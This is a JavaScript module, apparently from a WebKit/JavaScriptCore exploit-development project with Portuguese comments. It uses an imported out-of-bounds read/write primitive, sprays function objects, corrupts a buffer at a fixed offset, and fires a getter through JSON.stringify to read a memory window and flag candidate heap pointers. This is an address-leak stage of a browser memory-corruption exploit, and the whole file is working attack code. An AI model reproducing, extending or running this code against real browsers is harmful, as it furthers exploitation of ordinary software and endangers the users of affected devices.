// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Adicionando WEBKIT_LIBRARY_INFO

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_GETTER_LEAK_ATTEMPT = "getterLeakAttempt_v17a";

const GETTER_PROPERTY_NAME = "AAAA_GetterForLeakAnalysis_v17a";
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offsets no oob_array_buffer_real para plantar e observar
const PLANT_OFFSET_0x6C = 0x6C;
const PLANT_LOW_DWORD_0x6C = 0x170A170A; // "LEAK" em leetspeak reverso, apenas um marcador

// Janela de memória para ler dentro do getter (relativa ao oob_array_buffer_real.dataPointer)
const LEAK_WINDOW_START_OFFSET = 0x50; // Início da janela de leitura
const LEAK_WINDOW_SIZE_QWORDS = 8;   // Ler 8 QWORDS (64 bytes)

// ============================================================\n// VARIÁVEIS GLOBAIS PARA RESULTADOS DO GETTER\n// ============================================================
let getter_v17a_results = {};

// Função principal exportada
export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_GETTER_LEAK_ATTEMPT}: Leitura Especulativa de Ponteiros no Getter ---`, "test", FNAME_GETTER_LEAK_ATTEMPT);
    getter_v17a_results = {
        getter_called: false,
        error_in_getter: null,
        leaked_qwords: [],
        potential_pointers: []
    };

    // Alvo para addrof (vamos pulverizar um pouco)
    const TARGET_FUNCTION_MARKER = "TF_v17a_Marker";
    let targetFunc = function() { return TARGET_FUNCTION_MARKER; };
    let sprayedTargets = [];
    for (let i = 0; i < 50; i++) sprayedTargets.push(targetFunc); // Spray leve


    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_GETTER_LEAK_ATTEMPT);
            return;
        }

        // 1. Plantar valor em 0x6C
        const qword_to_plant_at_0x6C = new AdvancedInt64(PLANT_LOW_DWORD_0x6C, 0x00000000);
        oob_write_absolute(PLANT_OFFSET_0x6C, qword_to_plant_at_0x6C, 8);
        logS3(`Plantado ${qword_to_plant_at_0x6C.toString(true)} em oob_buffer[${toHex(PLANT_OFFSET_0x6C)}]`, "info", FNAME_GETTER_LEAK_ATTEMPT);

        // 2. Configurar o objeto com o getter
        const getterObject = {
            get [GETTER_PROPERTY_NAME]() {
                getter_v17a_results.getter_called = true;
                logS3(`    >>>> [GETTER ${GETTER_PROPERTY_NAME} ACIONADO!] <<<<`, "vuln", FNAME_GETTER_LEAK_ATTEMPT);
                try {
                    logS3(`    [GETTER]: Lendo janela de memória de oob_buffer[${toHex(LEAK_WINDOW_START_OFFSET)}] por ${LEAK_WINDOW_SIZE_QWORDS} QWORDS...`, "info", FNAME_GETTER_LEAK_ATTEMPT);
                    for (let i = 0; i < LEAK_WINDOW_SIZE_QWORDS; i++) {
                        const current_offset = LEAK_WINDOW_START_OFFSET + (i * 8);
                        const qword_val = oob_read_absolute(current_offset, 8);
                        getter_v17a_results.leaked_qwords.push({ offset: current_offset, value: qword_val.toString(true) });
                        logS3(`    [GETTER]: oob_buffer[${toHex(current_offset)}] = ${qword_val.toString(true)}`, "leak", FNAME_GETTER_LEAK_ATTEMPT);

                        // Análise básica de ponteiro (heurística)
                        // Um ponteiro de heap JSC geralmente é > 0x100000000 e alinhado em 8, não FF...FF
                        if (qword_val.high() > 0x0 && qword_val.high() < 0xFFFFFFF0 && (qword_val.low() % 8 === 0)) {
                            logS3(`      >>>> POTENCIAL PONTEIRO: ${qword_val.toString(true)} <<<<`, "vuln", FNAME_GETTER_LEAK_ATTEMPT);
                            getter_v17a_results.potential_pointers.push(qword_val.toString(true));
                            document.title = "POTENCIAL PONTEIRO!";
                        }
                    }
                } catch (e) {
                    getter_v17a_results.error_in_getter = e.message;
                    logS3(`    [GETTER]: ERRO DENTRO DO GETTER: ${e.message}`, "error", FNAME_GETTER_LEAK_ATTEMPT);
                }
                return "GetterLeakValue";
            }
        };

        // 3. Realizar a escrita OOB (trigger)
        logS3(`Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_GETTER_LEAK_ATTEMPT);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_GETTER_LEAK_ATTEMPT);
        await PAUSE_S3(100);

        // 4. Chamar JSON.stringify para acionar o getter
        logS3(`Chamando JSON.stringify para acionar o getter...`, "info", FNAME_GETTER_LEAK_ATTEMPT);
        try {
            JSON.stringify(getterObject);
        } catch (e) {
            logS3(`Erro durante JSON.stringify (fora do getter): ${e.message}`, "warn", FNAME_GETTER_LEAK_ATTEMPT);
        }

        // 5. Logar resultados do getter
        if (getter_v17a_results.getter_called) {
            logS3("  Getter foi acionado.", "good", FNAME_GETTER_LEAK_ATTEMPT);
            if (getter_v17a_results.error_in_getter) {
                logS3(`  Erro no getter: ${getter_v17a_results.error_in_getter}`, "error", FNAME_GETTER_LEAK_ATTEMPT);
            }
            if (getter_v17a_results.potential_pointers.length > 0) {
                logS3(`  POTENCIAIS PONTEIROS ENCONTRADOS NO GETTER: ${getter_v17a_results.potential_pointers.join(', ')}`, "vuln", FNAME_GETTER_LEAK_ATTEMPT);
                 document.title = `VAZOU ${getter_v17a_results.potential_pointers.length} PONTEIROS!`;
            } else {
                logS3("  Nenhum valor suspeito de ser ponteiro encontrado na janela lida pelo getter.", "info", FNAME_GETTER_LEAK_ATTEMPT);
                 document.title = "Getter OK, Sem Ponteiros";
            }
        } else {
            logS3("ALERTA: Getter NÃO foi chamado!", "error", FNAME_GETTER_LEAK_ATTEMPT);
             document.title = "Getter NÃO Chamado!";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_GETTER_LEAK_ATTEMPT}: ${e.message}`, "critical", FNAME_GETTER_LEAK_ATTEMPT);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_GETTER_LEAK_ATTEMPT);
        document.title = `${FNAME_GETTER_LEAK_ATTEMPT} FALHOU!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_GETTER_LEAK_ATTEMPT} Concluído ---`, "test", FNAME_GETTER_LEAK_ATTEMPT);
    }
    // Retornar os resultados para análise externa, se necessário
    return getter_v17a_results;
}
